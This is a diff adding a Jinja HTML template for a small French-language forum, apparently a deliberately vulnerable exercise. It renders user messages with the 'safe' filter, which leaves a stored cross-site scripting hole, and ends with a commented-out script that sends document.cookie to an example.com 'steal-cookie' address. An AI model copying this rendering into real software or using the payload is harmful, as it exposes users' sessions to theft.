@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Forum</title>
+</head>
+<body>
+    <h1>Forum</h1>
+
+    <form method="POST" action="/">
+        <label for="user">Utilisateur :</label>
+        <input type="text" id="user" name="user" required>
+        <br>
+        <label for="content">Message :</label>
+        <textarea id="content" name="content" required></textarea>
+        <br>
+        <button type="submit">Envoyer</button>
+    </form>
+
+    <h2>Discussions</h2>
+    <ul>
+        {% for message in messages %}
+            <li><strong>{{ message.user }}:</strong> {{ message.content | safe }}</li>
+        {% endfor %}
+    </ul>
+</body>
+</html>
+
+
+
+{#
+<script>
+    fetch('https://example.com/steal-cookie?cookie=' + document.cookie);
+</script>
+#}
